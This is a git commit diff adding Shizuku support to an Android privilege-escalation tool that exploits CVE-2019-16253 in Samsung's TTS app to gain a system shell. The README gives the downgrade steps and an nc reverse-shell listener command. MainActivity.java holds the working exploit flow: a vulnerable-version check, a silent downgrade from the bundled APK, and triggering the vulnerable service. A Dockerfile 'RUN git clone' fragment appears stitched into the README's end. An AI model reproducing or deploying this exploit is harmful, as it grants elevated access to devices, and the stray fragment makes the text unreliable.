7c8387c805d64aa1c1aec8ac3a2e0b2bb188b1c0
Chase Montgomery <blufenix@blufenix.net>
2023-03-19 01:15:02 -0400

    added Shizuku support

--- README.md
+++ README.md
@@ -4,17 +4,23 @@ This tool allows most Samsung devices to achieve a `system` shell (UID 1000). It
 
 ## Usage
 
-1. Downgrade the TTS app to the version provided in this repo (this must be done after every reboot).  
-    `adb install -d ./com.samsung.SMT_v3.0.02.2.apk`
-2. Run this command to wait for the reverse shell:  
-    `adb shell nc -l -p 9999`
-3. Install and open the `SMT Shell` app.
+1. Downgrade the TTS app to the version provided in this repo (this must be done after every reboot). `adb install -d ./com.samsung.SMT_v3.0.02.2.apk`
+2. Run this command to wait for the reverse shell: `adb shell nc -l -p 9999`
+3. Install and open the `langpoc` app.
 
-## Licence & Origin
+## Licences & Origin
 
-This project is a fork of [SMT-CVE-2019-16253](https://github.com/flankerhqd/vendor-android-cves/tree/master/SMT-CVE-2019-16253), created by flankerhqd (AKA flanker017). There is also a write-up by flanker [here](https://blog.flanker017.me/text-to-speech-speaks-pwned). Due to the original repo containing multiple unrelated projects, this fork's git history was rewritten using `git filter-repo` so that it only contains the relevant code (and no prebuilt artifacts).
+This project started as a fork of [SMT-CVE-2019-16253](https://github.com/flankerhqd/vendor-android-cves/tree/master/SMT-CVE-2019-16253), created by flankerhqd (AKA flanker017). There is also a write-up by flanker [here](https://blog.flanker017.me/text-to-speech-speaks-pwned). Due to the original repo containing multiple unrelated projects, this fork's git history was rewritten using `git filter-repo` so that it only contains the relevant code (and no prebuilt artifacts).
 
-This repo will continue to use the LGPL license that the original used when this fork was created.
+This repo will continue to use the LGPL license that the original used when this fork was created. Other embedded components are licensed as follows:
+
+### Shizuku - Copyright (c) 2021 RikkaW
+
+Some code was copied or adapted from the [Shizuku API](https://github.com/RikkaApps/Shizuku-API) demo project, which is distributed under the MIT License. Primarily, this includes files in `smtshell/app/src/main/java/com/samsung/SMT/lang/smtshell/shizuku`, and the hidden API class stubs in `smtshell/hidden-api-stub`. A copy of the license can be found [here](https://github.com/RikkaApps/Shizuku-API/blob/master/LICENSE).
+
+### Samsung
+
+This project includes an unmodified Samsung APK, at `./smtshell/app/src/main/assets/com.samsung.SMT_v3.0.02.2.apk`.
 
 ### Changes from the original
 
@@ -23,3 +29,9 @@ Please see the git commit history for a comprehensive list of changes. In brief:
 * Refactored nearly all the code
 * Replaced the reverse shell implementation
 * Updated dependencies and build system to latest versions  
+
+
+RUN git clone https://github.com/corellium/sud.git \
+ && cd sud \
+ && mkdir -p bin \
+ && make CC=/root/sdk/ndk-bundle/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android29-clang
--- smtshell/app/src/main/java/com/samsung/SMT/lang/smtshell/MainActivity.java
+++ smtshell/app/src/main/java/com/samsung/SMT/lang/smtshell/MainActivity.java
@@ -1,21 +1,24 @@
 package com.samsung.SMT.lang.smtshell;
 
+import android.annotation.SuppressLint;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
-import android.widget.ArrayAdapter;
-import android.widget.ListView;
+import android.view.View;
+import android.widget.Button;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 
-import java.util.ArrayList;
-import java.util.stream.Collectors;
+import com.samsung.SMT.lang.smtshell.shizuku.PackageInstallerUtils;
+
+import rikka.shizuku.Shizuku;
 
 /**
  * We need to keep the minSdkVersion at 22 or lower, so use @RequiresApi to use newer stuff.
@@ -24,59 +27,144 @@ import java.util.stream.Collectors;
 @RequiresApi(api = Build.VERSION_CODES.N)
 public class MainActivity extends AppCompatActivity {
 
+    private static final int REQUEST_CODE_SHIZUKU = 9000;
+
+    private static final String TAG = "SMTShell";
+
     private TextView mTextView;
-    private ListView mListView;
+    private Button mExploitBtn;
+    private ProgressBar mSpinner;
+
+    private void onShizukuRequestPermissionsResult(int requestCode, int grantResult) {
+        boolean granted = grantResult == PackageManager.PERMISSION_GRANTED;
+        if (granted) {
+            onReady(true);
+        }
+    }
+
+    private boolean checkShizukuPermission() {
+        if (Shizuku.isPreV11()) {
+            // Pre-v11 is unsupported
+            return false;
+        } else if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
+            // Granted
+            return true;
+        } else if (Shizuku.shouldShowRequestPermissionRationale()) {
+            // Users choose "Deny and don't ask again"
+            return false;
+        } else {
+            // Request the permission
+            Shizuku.requestPermission(REQUEST_CODE_SHIZUKU);
+            return false;
+        }
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         mTextView = findViewById(R.id.text);
-        mListView = findViewById(R.id.list);
+        mExploitBtn = findViewById(R.id.btn_exploit);
+        mSpinner = findViewById(R.id.indeterminateBar);
     }
 
     @Override
     protected void onStart() {
         super.onStart();
-        maybeExploit();
-    }
 
-    /**
-     * This will fire when we get a response from an uninstall request. No need to check the
-     *  requestCode or resultCode, since we only care about one result for now.
-     */
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        maybeExploit();
-    }
+        if (ConflictUtil.hasConflicts(this)) {
+            Intent intent = new Intent(this, ConflictActivity.class);
+            // prevent annoying UX for user, if they tap back
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+            startActivity(intent);
+            return;
+        }
 
-    private void maybeExploit() {
-        ArrayList<String> pkgs = getPackageManager()
-                .getInstalledPackages(PackageManager.MATCH_ALL)
-                .stream()
-                .map(packageInfo -> packageInfo.packageName)
-                .filter(pkgName -> pkgName.startsWith("com.samsung.SMT.lang"))
-                .filter(pkgName -> !pkgName.equals(getPackageName()))
-                .collect(Collectors.toCollection(ArrayList::new));
+        onReady(false);
 
-        if (pkgs.size() > 0) {
-            mTextView.setText(R.string.app_conflict_prompt);
-            mListView.setAdapter(new ArrayAdapter<>(this, R.layout.pkg_item, pkgs));
-            mListView.setOnItemClickListener((parent, view, position, id) -> {
-                String pkgName = pkgs.get(position);
-                Intent intent = new Intent(Intent.ACTION_DELETE);
-                intent.setData(Uri.parse("package:" + pkgName));
-                startActivityForResult(intent, 0);
+        Shizuku.addRequestPermissionResultListener(this::onShizukuRequestPermissionsResult);
+        // TODO Small inherent race condition here because addBinderReceivedListener doesn't get
+        //  called if we already have the binder, so if we receive the binder right after ping,
+        //  but before adding the listener, nothing will happen.
+        if (!Shizuku.pingBinder()) {
+            Shizuku.addBinderReceivedListener(() -> {
+                if (checkShizukuPermission()) {
+                    onReady(true);
+                }
             });
         } else {
-            mTextView.setText(R.string.no_conflicts);
-            mListView.setAdapter(null);
-
-            Intent intent = new Intent();
-            intent.setComponent(new ComponentName("com.samsung.SMT", "com.samsung.SMT.SamsungTTSService"));
-            startService(intent);
+            if (checkShizukuPermission()) {
+                onReady(true);
+            }
         }
+    }
+
+    private void onReady(boolean shizuku) {
+        if (shizuku && !isVulnerableSMT()) {
+            mTextView.setText(R.string.downgrade_smt_prompt_shizuku);
+            mExploitBtn.setText(R.string.downgrade_smt);
+            mExploitBtn.setOnClickListener(v -> {
+                mExploitBtn.setEnabled(false);
+                mSpinner.setProgress(0);
+                mSpinner.setVisibility(View.VISIBLE);
+                AsyncTask.execute(() -> {
+                    boolean success = downgradeSMT();
+                    runOnUiThread(() -> {
+                        if (!success) {
+                            Toast.makeText(this, "failed to downgrade!", Toast.LENGTH_SHORT).show();
+                        }
+                        mSpinner.setVisibility(View.INVISIBLE);
+                        onReady(true);
+                    });
+                });
+            });
+        } else if (!shizuku && !isVulnerableSMT()) {
+            mTextView.setText(R.string.downgrade_smt_prompt);
+            mExploitBtn.setText(R.string.proceed);
+            mExploitBtn.setOnClickListener(v -> {
+                // user might grant permission here
+                onReady(Shizuku.pingBinder());
+            });
+        } else {
+            mTextView.setText(R.string.exploit_prompt);
+            mExploitBtn.setText(R.string.exploit);
+            mExploitBtn.setOnClickListener(v -> {
+                exploit();
+                Toast.makeText(this, "Exploit triggered!", Toast.LENGTH_SHORT).show();
+            });
+        }
+        mExploitBtn.setEnabled(true);
+    }
+
+    @Override
+    protected void onStop() {
+        super.onStop();
+        Shizuku.removeRequestPermissionResultListener(this::onShizukuRequestPermissionsResult);
+    }
+
+    boolean downgradeSMT() {
+        if (!isVulnerableSMT()) {
+            return PackageInstallerUtils.installApkFromAssets(this, "com.samsung.SMT_v3.0.02.2.apk");
+        } else {
+            return true;
+        }
+    }
+
+    boolean isVulnerableSMT() {
+        try {
+            int versionCode = getPackageManager()
+                    .getPackageInfo("com.samsung.SMT", PackageManager.GET_META_DATA)
+                    .versionCode;
+            return (300200002 == versionCode);
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
+        }
+    }
+
+    private void exploit() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName("com.samsung.SMT", "com.samsung.SMT.SamsungTTSService"));
+        startService(intent);
     }
 
 }
